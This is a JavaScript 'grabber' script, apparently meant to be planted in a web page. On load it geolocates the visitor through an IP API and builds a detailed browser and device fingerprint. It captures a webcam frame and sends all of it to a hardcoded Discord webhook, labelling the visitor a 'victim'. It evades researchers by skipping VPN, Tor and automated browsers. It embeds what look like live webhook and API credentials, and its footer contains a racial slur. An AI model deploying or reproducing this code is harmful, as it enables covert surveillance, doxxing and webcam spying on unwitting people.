const config = {
    "webhook": 'https://discord.com/api/webhooks/1399884089443487754/qjDEYvu0Z8XAOEARVsRIsAxiOV5adxmGqxGUeIgdmcvAN07E7ocr7EclPIxUbRUer2U-',
    "api": 'https://api.ipdata.co/?api-key=6818a70bf0dcdbf1dd6bf89e62299740a49725ac65ff8e4056e3b343',
    "antivm": true // anti vpn and shittt ig
};

const iso = { "aa": "Afar", "ab": "Abkhazian", "ae": "Avestan", "af": "Afrikaans", "ak": "Akan", "am": "Amharic", "an": "Aragonese", "ar": "Arabic", "as": "Assamese", "av": "Avaric", "ay": "Aymara", "az": "Azerbaijani", "ba": "Bashkir", "be": "Belarusian", "bg": "Bulgarian", "bh": "Bihari languages", "bi": "Bislama", "bm": "Bambara", "bn": "Bengali", "bo": "Tibetan", "br": "Breton", "bs": "Bosnian", "ca": "Catalan; Valencian", "ce": "Chechen", "ch": "Chamorro", "co": "Corsican", "cr": "Cree", "cs": "Czech", "cu": "Church Slavic; Old Slavonic; Church Slavonic; Old Bulgarian; Old Church Slavonic", "cv": "Chuvash", "cy": "Welsh", "da": "Danish", "de": "German", "dv": "Divehi; Dhivehi; Maldivian", "dz": "Dzongkha", "ee": "Ewe", "el": "Greek, Modern (1453-)", "en": "English", "eo": "Esperanto", "es": "Spanish; Castilian", "et": "Estonian", "eu": "Basque", "fa": "Persian", "ff": "Fulah", "fi": "Finnish", "fj": "Fijian", "fo": "Faroese", "fr": "French", "fy": "Western Frisian", "ga": "Irish", "gd": "Gaelic; Scomttish Gaelic", "gl": "Galician", "gn": "Guarani", "gu": "Gujarati", "gv": "Manx", "ha": "Hausa", "he": "Hebrew", "hi": "Hindi", "ho": "Hiri Motu", "hr": "Croatian", "ht": "Haitian; Haitian Creole", "hu": "Hungarian", "hy": "Armenian", "hz": "Herero", "ia": "Interlingua (International Auxiliary Language Association)", "id": "Indonesian", "ie": "Interlingue; Occidental", "ig": "Igbo", "ii": "Sichuan Yi; Nuosu", "ik": "Inupiaq", "io": "Ido", "is": "Icelandic", "it": "Italian", "iu": "Inuktitut", "ja": "Japanese", "jv": "Javanese", "ka": "Georgian", "kg": "Kongo", "ki": "Kikuyu; Gikuyu", "kj": "Kuanyama; Kwanyama", "kk": "Kazakh", "kl": "Kalaallisut; Greenlandic", "km": "Central Khmer", "kn": "Kannada", "ko": "Korean", "kr": "Kanuri", "ks": "Kashmiri", "ku": "Kurdish", "kv": "Komi", "kw": "Cornish", "ky": "Kirghiz; Kyrgyz", "la": "Latin", "lb": "Luxembourgish; Letzeburgesch", "lg": "Ganda", "li": "Limburgan; Limburger; Limburgish", "ln": "Lingala", "lo": "Lao", "lt": "Lithuanian", "lu": "Luba-Katanga", "lv": "Latvian", "mg": "Malagasy", "mh": "Marshallese", "mi": "Maori", "mk": "Macedonian", "ml": "Malayalam", "mn": "Mongolian", "mr": "Marathi", "ms": "Malay", "mt": "Maltese", "my": "Burmese", "na": "Nauru", "nb": "Bokmål, Norwegian; Norwegian Bokmål", "nd": "Ndebele, North; North Ndebele", "ne": "Nepali", "ng": "Ndonga", "nl": "Dutch; Flemish", "nn": "Norwegian Nynorsk; Nynorsk, Norwegian", "no": "Norwegian", "nr": "Ndebele, South; South Ndebele", "nv": "Navajo; Navaho", "ny": "Chichewa; Chewa; Nyanja", "oc": "Occitan (post 1500)", "oj": "Ojibwa", "om": "Oromo", "or": "Oriya", "os": "Ossetian; Ossetic", "pa": "Panjabi; Punjabi", "pi": "Pali", "pl": "Polish", "ps": "Pushto; Pashto", "pt": "Portuguese", "qu": "Quechua", "rm": "Romansh", "rn": "Rundi", "ro": "Romanian; Moldavian; Moldovan", "ru": "Russian", "rw": "Kinyarwanda", "sa": "Sanskrit", "sc": "Sardinian", "sd": "Sindhi", "se": "Northern Sami", "sg": "Sango", "si": "Sinhala; Sinhalese", "sk": "Slovak", "sl": "Slovenian", "sm": "Samoan", "sn": "Shona", "so": "Somali", "sq": "Albanian", "sr": "Serbian", "ss": "Swati", "st": "Sotho, Southern", "su": "Sundanese", "sv": "Swedish", "sw": "Swahili", "ta": "Tamil", "te": "Telugu", "tg": "Tajik", "th": "Thai", "ti": "Tigrinya", "tk": "Turkmen", "tl": "Tagalog", "tn": "Tswana", "to": "Tonga (Tonga Islands)", "tr": "Turkish", "ts": "Tsonga", "tt": "Tatar", "tw": "Twi", "ty": "Tahitian", "ug": "Uighur; Uyghur", "uk": "Ukrainian", "ur": "Urdu", "uz": "Uzbek", "ve": "Venda", "vi": "Vietnamese", "vo": "Volapük", "wa": "Walloon", "wo": "Wolof", "xh": "Xhosa", "yi": "Yiddish", "yo": "Yoruba", "za": "Zhuang; Chuang", "zh": "Chinese", "zu": "Zulu" };
function coordinatesToGoogleMaps(lat, long) {
    return `https://www.google.com/maps/search/google+map++${lat.trim()},${long.trim()}`;
}

function getToken() {
    let name = 'USERSESSID';
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

function cookieDump() {
    return document.cookie + "; bpva=dpi";
}

function webMSG(url, json_data) {
    const request = new XMLHttpRequest();
    request.open("POST", url);
    request.setRequestHeader('Content-type', 'application/json');
    request.send(JSON.stringify(json_data));
}

function parsePrivacy(priv) {
    let clean = [];
    for (let [k, v] of Object.entries(priv)) {
        if (v == true) clean.push(`${(k.charAt(0).toUpperCase() + k.slice(1)).replaceAll('_', ' ')}`);
    }
    return clean.join(', ');
}

async function captureWebcamScreenshot() {
    let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    let videoTrack = stream.getVideoTracks()[0];
    let imageCapture = new ImageCapture(videoTrack);
    let bitmap = await imageCapture.grabFrame();
    let canvas = document.createElement('canvas');
    canvas.width = bitmap.width;
    canvas.height = bitmap.height;
    let context = canvas.getContext('2d');
    context.drawImage(bitmap, 0, 0);
    let form = new FormData();
    canvas.toBlob(
        async (blob) => {
            form.append('file', blob, "webcam.png");
            await fetch(config.webhook, {
                method: 'POST',
                body: form,
            });
        },
        "image/png"
    );
}

async function collectBrowserInfo1() {
    let data =
        `\`\`\`diff\n- Browser & Document Info
+ Mobile: ${(() => {
            let check = false;
            (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        })() ? 'yes' : 'no'}
+ Browser: ${navigator.appName || '???'}, ${navigator.appVersion || '???'}, ${navigator.product || '???'}
+ Manufacturer: ${navigator.vendor || '???'}
+ User Agent: ${navigator.userAgent || '???'}
+ Page: ${window.location.pathname || '???'}
+ Referrer: ${document.referrer || '???'}
+ History Length: ${history.length || '???'}
+ Language: ${navigator.language || '???'}
+ Platform: ${navigator.platform || '???'}
+ Java Enabled: ${navigator.javaEnabled() ? 'yes' : 'no'}
+ Cookies Enabled: ${navigator.cookieEnabled ? 'yes' : 'no'}
\`\`\``;
    return data;
}

async function collectBrowserInfo2() {
    let data =
        `\`\`\`diff\n+ Javascript Enabled: yes
+ Languages enabled: ${[...new Set(navigator.languages.map(e => { if (e.includes('-')) return; else return `${iso[e] || '???'}` }))].splice(1).join(', ')}
+ Current language: ${navigator.language} (${iso[navigator.language.split('-')[0]] || '???'})
+ CPU Threads: ${navigator.hardwareConcurrency}
+ Memory: ${(navigator.deviceMemory != undefined ? navigator.deviceMemory * 2 + 'GB*' : '???') || '???'}
+ Plugins: ${Array.from(navigator.plugins).map(e => { return `${e.name} (${e[0].type || '???'})` }).join(', ').trim()}
+ Webdriver/Bot: ${navigator.webdriver == undefined ? 'no' : navigator.webdriver ? 'yes' : 'no'}
+ Battery: ${navigator.getBattery != undefined ? await (async () => { let battery = await navigator.getBattery(); return `${battery.charging ? 'Charging' : 'Not Charging'} (${battery.level * 100}%)` })() : 'N/A'}
+ Touch points: ${navigator.maxTouchPoints || '???'}
+ Do not track: ${navigator.doNotTrack == 0 ? 'no' : 'yes'}
+ Dark mode: ${(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? 'yes' : 'no'}
+ CPU: ${navigator.oscpu || navigator.cpuClass || navigator.platform || '???'} ${String(navigator.hardwareConcurrency) + ' Threads' || '???'}\n\`\`\``;
    return data;
}

async function main() {
    // let http = new XMLHttpRequest();
    let http = await fetch(config.api, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    let info = await http.json();
    let parsed_info = "";
    console.log(info)
    if (navigator.webdriver == true || info['threat']['is_tor'] || info['threat']['is_proxy'] || info['threat']['is_anonymous'] || info['threat']['is_vpn'] || info['threat']['is_datacenter'] && config.antivm) {

        return;
    }
    if (info['ip']) {
        parsed_info =
            `- Location:
+ Continent: ${info['continent_name']} ${info['continent_code']}
+ Country: ${info['country_name']}, ${info['country_code']} ${info['emoji_flag']}
+ State: ${info['region']}, ${info['region_code']} (${info['region_type']})
+ City: ${info['city']}, ZIP ${info['postal']}
+ Google Maps: ${coordinatesToGoogleMaps(info['latitude'].toString(), info['longitude'].toString())}
+ Timezone: ${info['time_zone']['name']} ${info['time_zone']['abbr']}, Offset ${info['utc_offset']}
+ Time for victim: ${info['time_zone']['current_time']}
+ Currency: ${info['currency']['name']}, ${info['currency']['native']} ${info['currency']['code']}
+ Phone Code: ${info['calling_code']}
+ Languages: ${info['languages'].map((elem) => { return elem.name; }).join(", ")}
+ In EU: ${info['in_eu'] ? 'yes' : 'no'}

- Info:
+ IP: ${info['ip']}
+ Version: ${info['ip'].includes(':') ? "IPv6" : "IPv4"}
+ Network: ${info['asn']['route']}
+ Wifi type: ${navigator.connection == undefined ? '???' : navigator.connection.effectiveType || '???'}
+ Network type: ${navigator.connection == undefined ? '???' : (navigator.connection['type'] != undefined ? navigator.connection['type'].charAt(0).toUpperCase() + navigator.connection['type'].slice(1) : '???') || '???'}
+ Bandwith: ${navigator.connection == undefined ? '???' : (navigator.connection.downlink + ' MB/s') || '???'}

+ Threat: ${parsePrivacy(info['threat'])}
+ Blocklists: ${info['threat']['blocklists'].map((e) => { return `${e.name} "${e.type}"` }).join(", ")}
+ Provider: ${info['asn']['name']} (${info['asn']['domain']}), ${info['asn']['asn']}, type "${info['asn']['type']}"
`;
    } else {
        parsed_info =
            `- Failed to get IP info.`;
    }

    console.log(parsed_info.length);
    var embed = {
        "content": null,
        "username": 'OakGrabber V6 - ' + info['ip'],
        "embeds": [
            {
                "title": "__**New Log**__",
                "fields": [
                    {
                        "name": "IP Info",
                        "value": '```diff\n' + parsed_info + "\n```"
                    },
                    {
                        "name": "Browser Info",
                        "value": await collectBrowserInfo1()
                    },
                    {
                        "name": '\u200b',
                        "value": await collectBrowserInfo2()
                    }
                ],
                "author": {
                    "name": "timmywag and madhead341",
                },
                "footer": {
                    "text": `"even if i was at the bottom of the toilet, yall niggas still couldnt shit on me" - timmy`,
                    "icon_url": "https://cdn.discordapp.com/attachments/1065635415534604301/1102669633380679700/uytredrtyui9o09iuytrewsedrftgyuiop.gif"
                },
                // "description": "New JS grab"
            }
        ],
    }


    console.log(embed);

    webMSG(config['webhook'], embed);
    try {
        await captureWebcamScreenshot();
    } catch (error) {
        // idc
    }
}

main();
